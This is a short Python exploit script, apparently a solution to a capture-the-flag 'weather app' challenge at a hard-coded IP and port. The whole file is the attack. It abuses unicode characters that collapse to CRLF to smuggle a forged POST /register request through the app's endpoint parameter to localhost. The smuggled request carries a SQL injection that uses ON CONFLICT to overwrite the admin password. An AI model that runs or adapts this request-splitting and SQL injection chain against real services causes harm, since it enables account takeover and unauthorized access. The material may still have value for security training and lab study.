import requests

url = "http://68.183.47.198:30634/api/weather"

username = "admin"
new_password = "123456"
password = f"{new_password}') ON CONFLICT(username) DO UPDATE SET password = '{new_password}';"

username_encoded = username.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22") # %27='
password_encoded = password.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22") # %22="

contentLength = len(username_encoded) + len(password_encoded) + 20

# \u010D = \r, \u010A = \n, \u0120 = space
test = "127.0.0.1/\u010D\u010A" # endpoint value, look like as api.openweathermap.org
test = test + "\u010D\u010A" # blank line
test = test + "POST\u0120/register\u0120HTTP/1.1\u010D\u010A" # POST /register HTTP/1.1
test = test + "Host:\u0120127.0.0.1\u010D\u010A" # Host: 127.0.0.1
test = test + "Content-Type:\u0120application/x-www-form-urlencoded\u010D\u010A" # Content-Type: application/x-www-form-urlencoded
test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A" # Content-Length: ?
test = test + "\u010D\u010A" # blank line
test = test + f"username={username_encoded}&password={password_encoded}\u010D\u010A" # payload register
test = test + "\u010D\u010A" # blank line
test = test + "GET\u0120" # GET 

r = requests.post(url = url, json={'endpoint': test, 'city': 'Ha Noi','country': 'VN'})
